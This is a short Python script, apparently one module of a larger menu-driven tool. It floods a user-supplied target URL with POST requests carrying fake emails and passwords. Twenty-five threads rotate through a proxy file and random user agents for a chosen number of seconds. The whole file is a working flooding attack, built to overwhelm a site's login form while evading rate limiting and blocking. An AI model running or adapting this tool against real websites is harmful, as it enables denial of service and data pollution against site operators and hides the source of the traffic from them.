import threading
import requests
import random
import string
import names
import time
from proxycheck import proxycheckstart

from fake_useragent import UserAgent

def name_gen():
    name_system = random.choice(["FullName", "FullFirstFirstInitial", "FirstInitialFullLast"])
    first_name = names.get_first_name()
    last_name = names.get_last_name()
    if name_system == "FullName":
        return first_name + last_name
    elif name_system == "FullFirstFirstInitial":
        return first_name + last_name[0]
    return first_name[0] + last_name

def generate_random_email():
    name = name_gen()
    NumberOrNo=random.choice(["Number", "No"])
    domain = random.choice(["@gmail.com", "@yahoo.com", "@rambler.ru", "@protonmail.com", "@outlook.com", "@itunes.com"])#Popular email providers
    if NumberOrNo == "Number":
        return name + str(random.randint(1, 100)) + domain
    else:
        return name + domain

def generate_random_password():
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))

def send_posts(url, floodlength):
    start_time = time.time()
    with open("workin_proxy.txt", "r") as f:
        proxies = f.read().split("\n")

    while time.time() - start_time < floodlength:
        index = int((time.time() - start_time) % len(proxies))
        email = generate_random_email()
        password = generate_random_password()
        data = {"a": email, "az": password}
        ua = UserAgent()
        user_agent = ua.random
        headers = {'User-Agent': user_agent}
        response = requests.post(url, data=data, headers=headers, proxies={"http": proxies[index],"https": proxies[index]})
        print(f"Proxy using: {proxies[index]}")
        print(f"Email: {email}, Password: {password}, Status Code: {response.status_code}, headers: {user_agent}")

def pkmain(callback):
    url = input("Enter the URL of the target you want to flood: ")
    floodlength = int(input("\nEnter time in seconds you want to flood: "))
    threads = [threading.Thread(target=send_posts, args=(url,floodlength), daemon=True) for _ in range(25)]

    for t in threads:
        t.start()

    time.sleep(floodlength)

    for t in threads:
        t.join()

    print("Flood complete.  Back to menu...")
    time.sleep(3)
    callback()


